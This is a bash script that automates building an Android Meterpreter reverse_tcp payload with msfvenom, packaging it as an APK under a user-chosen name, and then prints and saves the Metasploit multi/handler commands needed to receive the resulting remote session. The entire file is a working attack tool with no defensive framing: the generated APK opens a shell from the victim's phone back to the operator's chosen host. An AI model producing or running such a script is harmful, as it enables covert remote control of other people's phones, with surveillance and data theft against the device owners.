#!/bin/bash

# Display local IP addresses
clear
ifconfig

# User input for payload configuration
read -p "Enter payload IP: " n1
read -p "Enter payload port: " n2
read -p "Enter payload name: " n3

# Generate Metasploit payload
msfvenom -p android/meterpreter/reverse_tcp LHOST=$n1 LPORT=$n2 -o $n3.apk
sleep 3
clear

# Display Metasploit commands
echo "msfconsole"
echo "use exploit/multi/handler"
echo "set payload android/meterpreter/reverse_tcp"
echo "set LHOST $n1"
echo "set LPORT $n2"
echo "#<=run payload=>#"
echo "exploit -j"
echo "sessions -i"

# Save Metasploit commands to a file named $n3.txt
echo "payload name =  $n3 " > $n3.txt
echo "payload ip =  $n1  " >> $n3.txt
echo "payload port =  $n2  " >> $n3.txt
echo "" >> $n3.txt
echo "" >> $n3.txt
echo "msfconsole" >> $n3.txt
echo "set payload android/meterpreter/reverse_tcp" >> $n3.txt
echo "set LHOST $n1" >> $n3.txt
echo "set LPORT $n2" >> $n3.txt
echo "" >> $n3.txt
echo "#<=run payload=>#" >> $n3.txt
echo "exploit -j" >> $n3.txt
echo "sessions -i" >> $n3.txt
